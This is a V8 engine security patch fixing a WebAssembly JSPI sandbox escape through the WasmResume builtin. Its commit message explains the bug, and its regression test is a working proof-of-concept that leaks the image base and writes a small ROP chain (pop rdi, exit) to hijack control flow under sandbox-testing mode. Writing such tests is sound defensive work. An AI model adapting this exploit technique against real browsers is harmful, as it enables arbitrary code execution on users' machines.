@@ -1,0 +1,192 @@
+From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
+From: Thibaud Michaud <thibaudm@chromium.org>
+Date: Wed, 15 Jul 2026 17:06:10 +0200
+Subject: [wasm][jspi][sandbox] Fix argument adaptation for WasmResume builtin
+
+Set the formal parameter count of WasmResume to 1 and enable argument
+adaptation (kAdapt) in SharedFunctionInfo creation.
+
+This vulnerability allows a V8 sandbox escape. An attacker with
+in-sandbox memory corruption capability can inspect a Promise object to
+retrieve its internal fulfill handler (WasmResume JSFunction) and invoke
+it directly with excess arguments. Previously, kDontAdapt with parameter
+count 0 allowed passing extra arguments on the stack, bypassing parameter
+popping on return in the WasmResume assembly builtin, resulting in stack
+pointer misalignment, return address override, and arbitrary native code
+execution (sandbox escape).
+
+Also categorize kWasmResume and kWasmReject as kJSTrampoline so
+JSDispatchTable compatibility verification succeeds under sandbox mode.
+
+Fixed: 513144331
+
+TAG=agy
+
+Change-Id: I6846c144d32106f7d6f045af9d90b08144de9068
+Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/8096849
+Reviewed-by: Clemens Backes <clemensb@chromium.org>
+Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
+Cr-Commit-Position: refs/heads/main@{#108668}
+
+diff --git a/src/builtins/builtins-inl.h b/src/builtins/builtins-inl.h
+index ed047c45dc00c3b77d6a787590404c8bb1561687..404b2977c81b2d6c135cbb89bc4b1022ca0655d7 100644
+--- a/src/builtins/builtins-inl.h
++++ b/src/builtins/builtins-inl.h
+@@ -320,6 +320,8 @@ bool Builtins::IsJSTrampoline(Builtin builtin) {
+     case Builtin::kJSToJSWrapper:
+     case Builtin::kJSToJSWrapperInvalidSig:
+     case Builtin::kWasmPromising:
++    case Builtin::kWasmResume:
++    case Builtin::kWasmReject:
+ #if V8_ENABLE_DRUMBRAKE
+     case Builtin::kGenericJSToWasmInterpreterWrapper:
+ #endif
+diff --git a/src/builtins/builtins.cc b/src/builtins/builtins.cc
+index d9a07f6ab1aef8fc24b6f641189206e5cdb1446c..d913d94b08277ba22f4ee083fb7c9d66bbcb7cb6 100644
+--- a/src/builtins/builtins.cc
++++ b/src/builtins/builtins.cc
+@@ -725,6 +725,8 @@ Builtins::JSBuiltinStateFlags Builtins::GetJSBuiltinState(Builtin builtin) {
+     case Builtin::kJSToJSWrapper:
+     case Builtin::kJSToJSWrapperInvalidSig:
+     case Builtin::kWasmPromising:
++    case Builtin::kWasmResume:
++    case Builtin::kWasmReject:
+ #if V8_ENABLE_DRUMBRAKE
+     case Builtin::kGenericJSToWasmInterpreterWrapper:
+ #endif
+@@ -734,8 +736,6 @@ Builtins::JSBuiltinStateFlags Builtins::GetJSBuiltinState(Builtin builtin) {
+     // These are core JS builtins which are instantiated lazily.
+     case Builtin::kWasmConstructorWrapper:
+     case Builtin::kWasmMethodWrapper:
+-    case Builtin::kWasmResume:
+-    case Builtin::kWasmReject:
+     // Well known import functions.
+     case Builtin::kWebAssemblyStringCast:
+     case Builtin::kWebAssemblyStringTest:
+diff --git a/src/heap/factory.cc b/src/heap/factory.cc
+index 00f8b2addf9c646b453cee15c1a71d8aeea9d928..a5780fe037d578d18e8bf68d74621012445190f0 100644
+--- a/src/heap/factory.cc
++++ b/src/heap/factory.cc
+@@ -2401,7 +2401,7 @@ Factory::NewSharedFunctionInfoForWasmJSFunction(
+ 
+ DirectHandle<SharedFunctionInfo> Factory::NewSharedFunctionInfoForWasmResume(
+     DirectHandle<WasmResumeData> data) {
+-  return NewSharedFunctionInfo({}, data, Builtin::kNoBuiltinId, 0, kDontAdapt);
++  return NewSharedFunctionInfo({}, data, Builtin::kNoBuiltinId, 1, kAdapt);
+ }
+ 
+ DirectHandle<SharedFunctionInfo>
+diff --git a/test/mjsunit/sandbox/wasm-jspi-resume-arity.js b/test/mjsunit/sandbox/wasm-jspi-resume-arity.js
+new file mode 100644
+index 0000000000000000000000000000000000000000..2e258603448c8e37c27d802b4c85ccd6e008a9f4
+--- /dev/null
++++ b/test/mjsunit/sandbox/wasm-jspi-resume-arity.js
+@@ -0,0 +1,108 @@
++// Copyright 2026 the V8 project authors. All rights reserved.
++// Use of this source code is governed by a BSD-style license that can be
++// found in the LICENSE file.
++
++// Flags: --sandbox-testing
++
++d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
++d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');
++
++const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
++
++let bp = [];
++function bsuspend() {
++  const p = new Promise(() => {});
++  bp.push(p);
++  return p;
++}
++const bb = new WasmModuleBuilder();
++const bimport = bb.addImport('m', 's', kSig_v_v);
++bb.addFunction('f', kSig_v_v)
++    .addBody([kExprCallFunction, bimport, kExprCallFunction, bimport])
++    .exportFunc();
++WebAssembly.promising(bb.instantiate({
++  m: {s: new WebAssembly.Suspending(bsuspend)}
++}).exports.f)();
++
++function get_resume(p) {
++  const p_ptr = getPtr(p);
++  const reaction = getField(p_ptr, kJSPromiseReactionsOrResultOffset);
++  return Sandbox.getObjectAt(
++      getField(reaction, kPromiseReactionFulfillHandlerOffset));
++}
++const resumeB = get_resume(bp[0]);
++
++let ap = [];
++function asuspend() {
++  const p = new Promise(() => {});
++  ap.push(p);
++  return p;
++}
++let carrier;
++let armed = false;
++function sink(x) {
++  if (!armed) return;
++  resumeB();
++  resumeB.call(carrier, x, x, x, x, x, x, x, x, x);
++}
++function warmSink(x) {}
++const ab = new WasmModuleBuilder();
++const aimport = ab.addImport('m', 's', kSig_r_v);
++const sinkImport = ab.addImport('m', 'i', kSig_v_r);
++const warmImport = ab.addImport('m', 'w', kSig_v_r);
++const keepSuspended = ab.addImport('m', 't', kSig_v_v);
++ab.addFunction('f', kSig_v_v)
++    .addBody([
++      kExprCallFunction, aimport,
++      kExprCallFunction, sinkImport,
++      kExprCallFunction, keepSuspended,
++    ])
++    .exportFunc();
++ab.addFunction('warm', makeSig([kWasmExternRef], []))
++    .addBody([kExprLocalGet, 0, kExprCallFunction, warmImport])
++    .exportFunc();
++const ai = ab.instantiate({m: {
++  s: new WebAssembly.Suspending(asuspend), i: sink,
++  w: warmSink,
++  t: new WebAssembly.Suspending(asuspend),
++}}).exports;
++
++const safe = {safe: true};
++for (let i = 0; i < 1001; ++i) ai.warm(safe);
++armed = true;
++
++WebAssembly.promising(ai.f)();
++const resumeA = get_resume(ap[0]);
++
++function stage(f, bad, values) {
++  const x = values[0];
++  if (bad) f(); else f(1);
++  return x;
++}
++function a(x) {} function b(x) {} function c(x) {}
++function d(x) {} function e(x) {}
++const targets = [a, b, c, d, e];
++const benign = new Float64Array(1);
++for (let i = 0; i < 1000; ++i) stage(targets[i % 5], !!(i & 1), benign);
++stage(a, false, benign);
++
++const names = Sandbox.getBuiltinNames();
++const pushCode = (Sandbox.getBuiltinCode(
++    names.indexOf('ArrayPrototypePush')) - 1) >>> 0;
++const pushEntry = mem.getBigUint64(pushCode + 24, true);
++const imageBase = pushEntry - 0x1bae300n;
++const popRdi = imageBase + 0x8206bcn;  // pop rdi; ret
++const exitPlt = imageBase + 0x2049720n;
++
++const backing = new Array(128).fill(1.1);
++const elements = Sandbox.readObjectField(backing, 'elements') >>> 0;
++carrier = Sandbox.getObjectAt(elements);
++const rop = getPtr(carrier);
++mem.setBigUint64(rop, popRdi, true);
++mem.setBigUint64(rop + 8, 42n, true);
++mem.setBigUint64(rop + 16, exitPlt, true);
++
++const raw = new BigUint64Array(1);
++const values = new Float64Array(raw.buffer);
++raw[0] = 0x414243444546n;
++stage(resumeA, true, values);
